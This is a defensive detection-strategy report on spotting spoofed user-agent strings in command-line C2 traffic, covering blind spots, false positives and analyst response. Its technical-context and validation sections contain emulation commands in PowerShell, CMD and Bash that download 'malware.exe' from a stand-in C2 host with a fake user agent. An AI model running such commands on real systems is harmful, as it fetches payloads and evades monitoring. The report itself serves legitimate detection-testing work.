# Alerting & Detection Strategy (ADS) Report

## Goal
This technique aims to detect adversarial attempts to bypass security monitoring by using malicious user agents in command-line operations across various platforms. The primary focus is on identifying and mitigating threats where adversaries use altered or custom user agent strings to obfuscate their activities during Command and Control (C2) communications.

## Strategy Abstract
The detection strategy involves monitoring command-line activity for the use of malicious or suspicious user agent strings. Key data sources include logs from shell environments (such as PowerShell on Windows and Bash on Linux/macOS) and network traffic logs that capture HTTP requests with unusual user-agent headers. The analysis focuses on identifying patterns where these user agents are used in conjunction with known C2 protocols or IP addresses.

## Technical Context
Adversaries often modify user agent strings to disguise the origin of their commands, making them appear as legitimate web browsers or benign applications. This can complicate detection by security tools that rely on recognizing standard application identifiers. In practice, adversaries execute this technique using scripts or manual command inputs across different platforms:

- **Windows:** PowerShell and CMD are commonly manipulated for this purpose.
- **Linux/macOS:** Bash and other shell environments are targets.

Adversary emulation might involve crafting commands like:
```powershell
Invoke-WebRequest -UserAgent "MaliciousAgent/1.0" http://c2server.com/malware.exe
```
or in CMD:
```cmd
curl -A "MaliciousAgent/1.0" http://c2server.com/malware.exe
```

## Blind Spots and Assumptions
- **Blind Spots:**
  - Encrypted traffic that cannot be inspected for user agent strings.
  - Legitimate applications that dynamically change their user-agent strings.

- **Assumptions:**
  - User agents are a reliable indicator of malicious activity, which may not always hold true if legitimate software changes its agent string.
  - Complete logging and capture of command-line executions across all platforms are assumed to be in place.

## False Positives
Potential benign activities include:
- Web scraping tools or bots that use custom user agents for identification.
- Development environments where developers manually set user-agent strings during testing.
- Legitimate services using non-standard user agent formats for proprietary purposes.

## Priority
**Severity:** High

**Justification:** The ability of adversaries to bypass security monitoring through altered user agents poses a significant threat, especially in environments with heavy web traffic. Early detection and mitigation are crucial to prevent further compromise.

## Validation (Adversary Emulation)
### Malicious User Agents - Powershell
1. Open PowerShell as an administrator.
2. Execute: 
   ```powershell
   Invoke-WebRequest -UserAgent "MaliciousAgent/1.0" http://c2server.com/malware.exe
   ```

### Malicious User Agents - CMD
1. Open Command Prompt.
2. Execute:
   ```cmd
   curl -A "MaliciousAgent/1.0" http://c2server.com/malware.exe
   ```

### Malicious User Agents - Nix (Bash)
1. Open Terminal on macOS/Linux.
2. Execute:
   ```bash
   wget --user-agent="MaliciousAgent/1.0" http://c2server.com/malware.exe
   ```

## Response
When an alert is triggered, analysts should:
- Verify the legitimacy of the user agent string and associated activities.
- Examine network traffic logs for unusual patterns or connections to known malicious IP addresses.
- Isolate affected systems to prevent further spread of potential malware.
- Update detection rules to account for new variations in user-agent strings.
